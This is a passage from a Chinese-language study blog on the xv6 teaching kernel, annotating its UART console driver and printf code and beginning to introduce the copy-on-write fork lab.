class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// map major device number to device functions.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">devsw</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> (*read)(<span class="type">int</span>, uint64, <span class="type">int</span>);</span><br><span class="line">  <span class="type">int</span> (*write)(<span class="type">int</span>, uint64, <span class="type">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> <span class="title">devsw</span> <span class="title">devsw</span>[];</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CONSOLE 1</span></span><br></pre></td></tr></table></figure></li></ul></li></ul><p><code>consoleinit</code>函数将设备CONSOLE的读取和写入函数映射到设备号中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">consoleinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  initlock(&amp;cons.lock, <span class="string">&quot;cons&quot;</span>); <span class="comment">// 初始化 控制台结构的锁</span></span><br><span class="line"></span><br><span class="line">  uartinit(); <span class="comment">// 初始化uart接口</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// connect read and write system calls</span></span><br><span class="line">  <span class="comment">// to consoleread and consolewrite.</span></span><br><span class="line">  devsw[CONSOLE].read = consoleread;</span><br><span class="line">  devsw[CONSOLE].write = consolewrite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="uart-c"><a href="#uart-c" class="headerlink" title="uart.c"></a><code>uart.c</code></h3><p>这段代码是针对<code>16550A UART</code>的低级驱动程序。</p><p><code>16550A UART</code>是一种广泛使用的串行通信接口芯片。</p><h4 id="宏定义"><a href="#宏定义" class="headerlink" title="宏定义"></a>宏定义</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">define</span> Reg(reg) ((volatile unsigned char *)(UART0 + reg)) <span class="comment">// 返回uart control register在内存映射中的位置。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ReadReg(reg) (*(Reg(reg)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WriteReg(reg, v) (*(Reg(reg)) = (v))</span></span><br></pre></td></tr></table></figure><h4 id="UART-control-registers"><a href="#UART-control-registers" class="headerlink" title="UART control registers"></a>UART control registers</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> RHR 0                 <span class="comment">// receive holding register (for input bytes)      暂存接收到的输入字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> THR 0                 <span class="comment">// transmit holding register (for output bytes)  暂存即将发送的输出字节</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IER 1                 <span class="comment">// interrupt enable register</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IER_RX_ENABLE (1&lt;&lt;0)  <span class="comment">// 启动接收中断的位掩码</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IER_TX_ENABLE (1&lt;&lt;1)  <span class="comment">// 启动发送中断的位掩码</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FCR 2                 <span class="comment">// FIFO control register </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FCR_FIFO_ENABLE (1&lt;&lt;0) <span class="comment">// 启用FIFO位掩码</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FCR_FIFO_CLEAR (3&lt;&lt;1) <span class="comment">// clear the content of the two FIFOs 清除两个FIFO内容的位掩码。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ISR 2                 <span class="comment">// interrupt status register</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LCR 3                 <span class="comment">// line control register LCR寄存器的地址定义为3。这个寄存器用于配置数据格式，比如数据位、停止位和奇偶校验位。 </span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LCR_EIGHT_BITS (3&lt;&lt;0) <span class="comment">// 设置数据位为8位的位掩码。</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LCR_BAUD_LATCH (1&lt;&lt;7) <span class="comment">// special mode to set baud rate</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LSR 5                 <span class="comment">// line status register</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LSR_RX_READY (1&lt;&lt;0)   <span class="comment">// input is waiting to be read from RHR</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LSR_TX_IDLE (1&lt;&lt;5)    <span class="comment">// THR can accept another character to send</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ReadReg(reg) (*(Reg(reg)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WriteReg(reg, v) (*(Reg(reg)) = (v))</span></span><br></pre></td></tr></table></figure><h4 id="uartinit"><a href="#uartinit" class="headerlink" title="uartinit()"></a><code>uartinit()</code></h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uartinit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// disable interrupts.</span></span><br><span class="line">  WriteReg(IER, <span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// special mode to set baud rate.</span></span><br><span class="line">  WriteReg(LCR, LCR_BAUD_LATCH);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// LSB for baud rate of 38.4K. 低字节</span></span><br><span class="line">  WriteReg(<span class="number">0</span>, <span class="number">0x03</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// MSB for baud rate of 38.4K. 高字节</span></span><br><span class="line">  WriteReg(<span class="number">1</span>, <span class="number">0x00</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// leave set-baud mode,</span></span><br><span class="line">  <span class="comment">// and set word length to 8 bits, no parity.</span></span><br><span class="line">  <span class="comment">// 离开设置波特率的模式，并配置数据字长为8位，无校验位。</span></span><br><span class="line">  <span class="comment">// 这是通过再次写入LCR寄存器，但这次使用LCR_EIGHT_BITS来完成的。</span></span><br><span class="line">  WriteReg(LCR, LCR_EIGHT_BITS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// reset and enable FIFOs.</span></span><br><span class="line">  <span class="comment">// 通过写入FIFO控制寄存器（FCR），启用并清除FIFO（先进先出队列）。</span></span><br><span class="line">  <span class="comment">// 这有助于确保发送和接收的数据能够被正确地缓存，同时清除可能存在的任何旧数据。</span></span><br><span class="line">  WriteReg(FCR, FCR_FIFO_ENABLE | FCR_FIFO_CLEAR);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// enable transmit and receive interrupts.</span></span><br><span class="line">  <span class="comment">// 再次写入IER寄存器，这次是为了启用发送（IER_TX_ENABLE）和接收（IER_RX_ENABLE）中断。</span></span><br><span class="line">  <span class="comment">// 这允许UART在发送缓冲区空闲或接收到数据时，通过中断通知CPU。</span></span><br><span class="line">  WriteReg(IER, IER_TX_ENABLE | IER_RX_ENABLE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 初始化UART发送锁：</span></span><br><span class="line">  initlock(&amp;uart_tx_lock, <span class="string">&quot;uart&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>uartputc()</code></p><ul><li>将一个字符添加到输出缓冲区并通知UART开始发送（如果尚未开始）</li><li>如果输出缓冲区已满，则阻塞</li><li>因为该函数可能会阻塞，所以不能被中断调用</li><li>所以该函数只适合被<code>write()</code>调用</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">uartputc</span><span class="params">(<span class="type">int</span> c)</span></span><br><span class="line">&#123;</span><br><span class="line">  acquire(&amp;uart_tx_lock);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 如果系统遇到一个严重的错误，则panicked为真，不再执行后续代码</span></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// UART 传输缓冲区 满</span></span><br><span class="line">  <span class="keyword">while</span>(uart_tx_w == uart_tx_r + UART_TX_BUF_SIZE)&#123;</span><br><span class="line">    <span class="comment">// buffer is full.</span></span><br><span class="line">    <span class="comment">// wait for uartstart() to open up space in the buffer.</span></span><br><span class="line">    <span class="comment">// 调用sleep会导致调用线程阻塞</span></span><br><span class="line">    sleep(&amp;uart_tx_r, &amp;uart_tx_lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 向uart输出循环缓冲区写入字符c</span></span><br><span class="line">  uart_tx_buf[uart_tx_w % UART_TX_BUF_SIZE] = c;</span><br><span class="line">  uart_tx_w += <span class="number">1</span>; <span class="comment">// 写索引加1</span></span><br><span class="line">  uartstart();</span><br><span class="line">  release(&amp;uart_tx_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="uartstart"><a href="#uartstart" class="headerlink" title="uartstart()"></a><code>uartstart()</code></h4><p>如果<code>UART</code>当前是空闲的，且一个字符正在输出缓冲区中等待，该函数将会把这个字符传输出去。</p><p>该函数的调用者必须先对<code>uart_tx_lock</code>上锁</p><p>设备中断的上半和下半部分都可以调用该函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">uartstart</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(uart_tx_w == uart_tx_r)&#123;</span><br><span class="line">      <span class="comment">// transmit buffer is empty.</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取 Line Status Register 并判断 UART Transmit Holding Register 是否空闲 </span></span><br><span class="line">    <span class="keyword">if</span>((ReadReg(LSR) &amp; LSR_TX_IDLE) == <span class="number">0</span>)&#123;</span><br><span class="line">      <span class="comment">// the UART transmit holding register is full,</span></span><br><span class="line">      <span class="comment">// so we cannot give it another byte.</span></span><br><span class="line">      <span class="comment">// it will interrupt when it&#x27;s ready for a new byte.</span></span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 读取 uart 输出缓冲区的一个字符</span></span><br><span class="line">    <span class="type">int</span> c = uart_tx_buf[uart_tx_r % UART_TX_BUF_SIZE];</span><br><span class="line">    uart_tx_r += <span class="number">1</span>; <span class="comment">// uart输出缓冲区读索引加1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// maybe uartputc() is waiting for space in the buffer.</span></span><br><span class="line">    <span class="comment">// 或许有uartputc正在等待uart输出缓冲区的空间</span></span><br><span class="line">    wakeup(&amp;uart_tx_r);</span><br><span class="line">    <span class="comment">// 将缓冲区读取的数据写入UART的发送保持寄存器</span></span><br><span class="line">    WriteReg(THR, c);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="uartputc-sync"><a href="#uartputc-sync" class="headerlink" title="uartputc_sync()"></a><code>uartputc_sync()</code></h4><p>uartputc的另一个版本，不使用中断，用于内核的printf和回显字符。它等待循环，知道UART的输出寄存器为空</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">uartputc_sync</span><span class="params">(<span class="type">int</span> c)</span> &#123;</span><br><span class="line">  push_off(); <span class="comment">// 禁止中断</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(panicked)&#123;</span><br><span class="line">    <span class="keyword">for</span>(;;)</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 轮询等待知道THR为空</span></span><br><span class="line">  <span class="comment">// wait for Transmit Holding Empty to be set in LSR.</span></span><br><span class="line">  <span class="keyword">while</span>((ReadReg(LSR) &amp; LSR_TX_IDLE) == <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="comment">// 向 THR 中写入数据c</span></span><br><span class="line">  WriteReg(THR, c);</span><br><span class="line"></span><br><span class="line">  pop_off(); <span class="comment">// 启用中断</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>uartputc_sync</code>并没有使用 uart输出缓冲区 <code>UART_TX_BUF</code></p><h4 id="uartgetc"><a href="#uartgetc" class="headerlink" title="uartgetc()"></a><code>uartgetc()</code></h4><p>从UART中读取一个输入字符，如果没有则返回-1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">uartgetc</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span>(ReadReg(LSR) &amp; <span class="number">0x01</span>)&#123;</span><br><span class="line">    <span class="comment">// input data is ready.</span></span><br><span class="line">    <span class="keyword">return</span> ReadReg(RHR); <span class="comment">// Receive Holding Register</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="uartintr"><a href="#uartintr" class="headerlink" title="uartintr()"></a><code>uartintr()</code></h4><p>处理一个uart中断，当一个输入到达时，或者uart已经准备好更多的输出时使用，被<code>devintr()</code>调用，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">uartintr</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">// read and process incoming characters.</span></span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="type">int</span> c = uartgetc();<span class="comment">// 读取uart中的输入字符</span></span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">-1</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    consoleintr(c); <span class="comment">// 将c传输给console</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// send buffered characters. 传输缓冲区的字符</span></span><br><span class="line">  acquire(&amp;uart_tx_lock);</span><br><span class="line">  uartstart();</span><br><span class="line">  release(&amp;uart_tx_lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="printf-c"><a href="#printf-c" class="headerlink" title="printf.c"></a><code>printf.c</code></h3><h4 id="pr-struct"><a href="#pr-struct" class="headerlink" title="pr struct"></a><code>pr struct</code></h4><p>锁，用于避免并发的printf操作交互执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">spinlock</span> <span class="title">lock</span>;</span></span><br><span class="line">  <span class="type">int</span> locking;</span><br><span class="line">&#125; pr;</span><br></pre></td></tr></table></figure><h4 id="printint"><a href="#printint" class="headerlink" title="printint"></a><code>printint</code></h4><p>打印整型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printint</span><span class="params">(<span class="type">int</span> xx, <span class="type">int</span> base, <span class="type">int</span> sign)</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">16</span>];</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  uint x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(sign &amp;&amp; (sign = xx &lt; <span class="number">0</span>))</span><br><span class="line">    x = -xx;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    x = xx;</span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span> &#123;</span><br><span class="line">    buf[i++] = digits[x % base];</span><br><span class="line">  &#125; <span class="keyword">while</span>((x /= base) != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(sign)</span><br><span class="line">    buf[i++] = <span class="string">&#x27;-&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(--i &gt;= <span class="number">0</span>)</span><br><span class="line">    consputc(buf[i]); <span class="comment">// 向console输入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="printptr"><a href="#printptr" class="headerlink" title="printptr"></a><code>printptr</code></h4><p>打印指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">printptr</span><span class="params">(uint64 x)</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  consputc(<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">  consputc(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span>(uint64) * <span class="number">2</span>); i++, x &lt;&lt;= <span class="number">4</span>)</span><br><span class="line">    consputc(digits[x &gt;&gt; (<span class="keyword">sizeof</span>(uint64) * <span class="number">8</span> - <span class="number">4</span>)]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="printf"><a href="#printf" class="headerlink" title="printf"></a><code>printf</code></h4><ul><li><code>ap</code>是一个可变参数列表</li><li><code>va_start(ap, fmt)</code>，fmt是函数中最后一个已知的固定参数，它告诉<code>va_start</code>可变参数列表在内存中的起始位置在哪里</li><li><code>va_arg(ap, int)</code>，从<code>ap</code>中提取一个类型为<code>int</code>的参数</li><li><strong>用法示例</strong>：在处理<code>printf</code>格式字符串中的<code>%d</code>占位符时，可以使用<code>printint(va_arg(ap, int), 10, 1);</code>来读取一个整数参数，并将其按十进制格式输出。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Print to the console. only understands %d, %x, %p, %s.</span></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">printf</span><span class="params">(<span class="type">char</span> *fmt, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">  va_list ap;</span><br><span class="line">  <span class="type">int</span> i, c, locking;</span><br><span class="line">  <span class="type">char</span> *s;</span><br><span class="line"></span><br><span class="line">  locking = pr.locking;</span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    acquire(&amp;pr.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fmt == <span class="number">0</span>)</span><br><span class="line">    panic(<span class="string">&quot;null fmt&quot;</span>);</span><br><span class="line"></span><br><span class="line">  va_start(ap, fmt); <span class="comment">// 初始化 va_list类型的变量 args 以便后续通过va_arg宏访问函数的可变参数列表</span></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; (c = fmt[i] &amp; <span class="number">0xff</span>) != <span class="number">0</span>; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(c != <span class="string">&#x27;%&#x27;</span>)&#123;</span><br><span class="line">      consputc(c); <span class="comment">// 如果不是%d这样的占位符，则直接输出到console中</span></span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    c = fmt[++i] &amp; <span class="number">0xff</span>;</span><br><span class="line">    <span class="keyword">if</span>(c == <span class="number">0</span>) <span class="comment">// 结束输出</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">switch</span>(c)&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">10</span>, <span class="number">1</span>); <span class="comment">// 输出整型</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;x&#x27;</span>:</span><br><span class="line">      printint(va_arg(ap, <span class="type">int</span>), <span class="number">16</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;p&#x27;</span>:</span><br><span class="line">      printptr(va_arg(ap, uint64));</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">      <span class="keyword">if</span>((s = va_arg(ap, <span class="type">char</span>*)) == <span class="number">0</span>)</span><br><span class="line">        s = <span class="string">&quot;(null)&quot;</span>;</span><br><span class="line">      <span class="keyword">for</span>(; *s; s++)</span><br><span class="line">        consputc(*s);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">// Print unknown % sequence to draw attention.</span></span><br><span class="line">      consputc(<span class="string">&#x27;%&#x27;</span>);</span><br><span class="line">      consputc(c);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  va_end(ap);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(locking)</span><br><span class="line">    release(&amp;pr.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="panic"><a href="#panic" class="headerlink" title="panic"></a><code>panic</code></h4><p>打印panic</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">panic</span><span class="params">(<span class="type">char</span> *s)</span> &#123;</span><br><span class="line">  pr.locking = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;panic: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  panicked = <span class="number">1</span>; <span class="comment">// freeze uart output from other CPUs</span></span><br><span class="line">  <span class="keyword">for</span>(;;)</span><br><span class="line">    ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="printfinit"><a href="#printfinit" class="headerlink" title="printfinit"></a><code>printfinit</code></h4><p>初始化printf锁</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">printfinit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  initlock(&amp;pr.lock, <span class="string">&quot;pr&quot;</span>);</span><br><span class="line">  pr.locking = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="实验部分"><a href="#实验部分" class="headerlink" title="实验部分"></a>实验部分</h2><p>虚拟内存提供了一定程度的间接性：内核可以通过将 PTE 标记为无效或只读来拦截内存引用，从而导致页面错误，并且可以通过修改 PTE 来更改地址的含义。 计算机系统中有一种说法，任何系统问题都可以通过一定程度的间接解决。 本实验探讨了一个示例：copy-on-write fork</p><h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>xv6中的<code>fork()</code>系统调用会复制父进程的所有用户空间内存到子进程。如果父进程很大，复制操作可能会花费很长时间。更糟糕的是，这项工作往往大部分是浪费的：<code>fork()</code>通常会在子进程中紧接着执行<code>exec()</code>，这将丢弃已复制的内存，通常在未使用大部分已复制内存的情况下。另一方面，如果父进程和子进程都使用了复制的页面，并且它们中的一个或两个对其进行了写操作，那么真正需要这个副本。</p><h3 id="解决办法"><a href="#解决办法" 